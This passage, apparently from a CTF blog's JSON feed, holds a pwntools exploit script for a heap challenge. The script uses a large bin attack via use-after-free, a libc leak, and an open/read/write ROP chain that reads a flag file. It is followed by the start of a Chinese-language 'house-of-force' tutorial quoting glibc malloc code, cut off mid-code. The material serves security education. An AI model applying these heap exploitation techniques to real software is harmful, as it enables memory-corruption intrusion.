data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>Delllim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>Delllim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>Delllims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> Delllims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>Delllims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>paddding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'give you a gift: 0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>elfbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x4010</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'elfbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    meau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"How many pages does your book need?\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>y <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>id1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>ct <span class=\"token operator\">=</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    meau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"o delete?\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">if</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"being deleted?(y/n)\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"which page do you want to write?\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>id1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"content: \\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"being deleted?(y/n)\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    meau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"come on,Write down your story!\\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>rdi <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x1863</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>rsi <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x1861</span> <span class=\"token comment\"># pop rsi r15 ret</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>bss <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x4110</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>edit_ret <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'edit_the_book'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>putg <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>putp <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk0</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1 chunk1</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2 chunk2</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#  chunk0 進入 unsortedbin</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0 chunk3 chunk1 進入 largebin    </span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>book <span class=\"token operator\">=</span> elfbase <span class=\"token operator\">+</span> <span class=\"token number\">0x4050</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>book <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 釋放 chunk2, 進入 unsortedbin 內，同時 uaf 修改 chunk0 的 bk 指針，指向目的地址</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># &lt;large bin attack>,chunk2 插入 largebin 內，同時覆蓋地址 chunk1->bknextsize->fdnextsize 指向 chunk2</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>pay <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>paddding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdi<span class=\"token punctuation\">,</span> putg<span class=\"token punctuation\">,</span> putp<span class=\"token punctuation\">,</span> edit_ret<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>Edi<span class=\"token punctuation\">(</span>flat<span class=\"token punctuation\">(</span>pay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>rax <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x45eb0</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>rdx <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x904a9</span> <span class=\"token comment\">#pop rdx; pop rbx; ret; </span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>rsi <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x16333a</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>pay <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    paddding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> bss<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    rdi<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> rsi<span class=\"token punctuation\">,</span> bss<span class=\"token operator\">+</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> rdx<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> write_addr</pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'come on,Write down your story!\\n'</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>se<span class=\"token punctuation\">(</span><span class=\"token string\">b'./flag\\x00\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token function\">chunksize_nomask</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    fwd <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    bck <span class=\"token operator\">=</span> bck<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    fwd<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/19/house-of-force/",
            "url": "https://yhuanhuan01.github.io/2024/07/19/house-of-force/",
            "title": "house-of-force",
            "date_published": "2024-07-19T01:01:10.000Z",
            "content_html": "<h1 id=\"house-of-force\"><a class=\"markdownIt-Anchor\" href=\"#house-of-force\">#</a> house-of-force</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> ——  <code>2.27</code></li>\n<li>可分配任意大小的  <code>chunk</code></li>\n<li>需要泄露或已知地址</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>堆溢出写 topchunk 的 size，使得 size 值很大。可以申请到一些可利用地址</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>victim <span class=\"token operator\">=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取当前 top chunk 的地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      size <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 计算 top chunk 的大小</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>nb <span class=\"token operator\">+</span> MINSIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token comment\">//MINSIZE 就是堆块的最小 size，32 位程序为 0x10，64 位程序为 0x20</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token comment\">// 如果 top chunk 的大小大于 nb (程序执行 malloc 需要分配的内存大小)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token comment\">// 加上 MINSIZE 的大小，就从 top chunk 中来切一块内存</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token comment\">// 之所以要加上 MINSIZE 是要保证切割后剩余的内存要是一个完整的堆块</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>          remainder_size <span class=\"token operator\">=</span> size <span class=\"token operator\">-</span> nb<span class=\"token punctuation\">;</span><span class=\"token comment\">//remainder_size 为切割后的剩余大小</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>          remainder <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//remainder 为切割前 top chunk+nb 的值，也就是切割后 top chunk 的地址</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>          av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> remainder<span class=\"token punctuation\">;</span><span class=\"token comment\">// 更新 top chunk</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>          <span class=\"token comment\">// 下面两个 set_head 给切割出去的堆块以及切割后的 top chunk 设置新的 size</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>          <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb <span class=\"token operator\">|</span> PREV_INUSE <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                    <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">?</span> NON_MAIN_ARENA <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>          <span class=\"token function\">set_head</span> <span class=\"token punctuation\">(</span>remainder<span class=\"token punctuation\">,</span> remainder_size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token function\">check_malloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 调试用的，这里没用</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 